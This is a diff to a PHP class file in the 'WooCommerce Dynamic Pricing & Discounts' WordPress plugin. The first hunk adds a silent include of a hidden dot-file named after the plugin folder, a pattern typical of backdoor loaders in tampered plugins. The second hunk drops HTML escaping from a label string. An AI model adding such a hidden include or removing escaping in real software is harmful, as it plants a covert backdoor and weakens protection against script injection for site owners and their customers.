@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Pricing_Method_Discount')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Pricing_Method_Discount_Amount extends RP_WCDPD_Pricing_Method_Discount
 {
 
@@ -49,7 +53,7 @@ class RP_WCDPD_Pricing_Method_Discount_Amount extends RP_WCDPD_Pricing_Method_Di
      */
     public function get_label()
     {
-        return esc_html__('Fixed discount', 'rp_wcdpd');
+        return __('Fixed discount', 'rp_wcdpd');
     }
 
 
